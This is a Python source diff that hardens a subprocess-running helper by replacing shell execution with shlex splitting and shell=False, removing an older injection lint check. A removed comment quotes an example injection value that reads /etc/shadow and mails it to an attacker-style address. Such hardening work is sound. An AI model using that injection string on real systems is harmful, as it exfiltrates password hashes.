@@ -24,6 +24,7 @@ Usage::
 # Standard Libraries #
 ######################
 from __future__ import absolute_import
+import shlex
 import signal
 import sys
 import os
@@ -73,7 +74,7 @@ class IORunCmd(object):
         self.stderr     = [ ]
         self.exception  = None
 
-    def run(self, command, filters = [], shell = None, timeout = None, timeout_terminate_signal=signal.SIGTERM, lint_command=True):
+    def run(self, command, filters = [], timeout = None, timeout_terminate_signal=signal.SIGTERM):
         log     = self.___logger
         stats   = self.___stats
 
@@ -90,41 +91,17 @@ class IORunCmd(object):
 
         log.debug('Applying output filters: %s' % [r.pattern for r in filters])
 
-        # Use shell param if set, otherwise use shell if we were passed a string
-        # so that the shell can parse it and support quoted or escaped arguments
-        # properly, such as:
+        # if the command is a string, split it using shlex; which correctly handles quoted args like:
         #  cat "/var/log/foo bar.log" /var/log/baz\ .log
-        if shell is None:
-            shell = isinstance(command, basestring)
-
-        # GOTCHA: If the process is created using shell, upon timeout, the shell process will be
-        # terminated but not the actual command. Use 'exec' shell keyword so that the actual command's process
-        # is terminated and prevent a false timeout.
-        if shell is True and timeout is not None:
-            command = 'exec ' + command
-
-        # GOTCHA: in the case where run() is called with user input populating `command`, the oppportunity exists to
-        # pass in a filename like `sudo cat /etc/shadow | mail -s hi cracker@p0wn.io`. We should cowardly fail to run
-        # such a command, unless linting has been disabled.
-        if lint_command:
-            command_string = command
-            if isinstance(command, object):
-                command_string = str(command)
-            if isinstance(command, list):
-                command_string = ' '.join(command)
-            if re.search(r'[`$()]', command_string):
-                log.error("command %s looks like it might be trying to spawn another command, not executing!", command)
-                self.ok = False
-                self.exception = True
-                self.returncode = 256
-                return False
+        if isinstance(command, basestring):
+            command = shlex.split(command)
 
         try:
             process = subprocess.Popen(
                 command,
                 stderr = subprocess.PIPE,
                 stdout = subprocess.PIPE,
-                shell = shell
+                shell = False
             )
 
             # Note that using communicate() buffers all output in memory and can
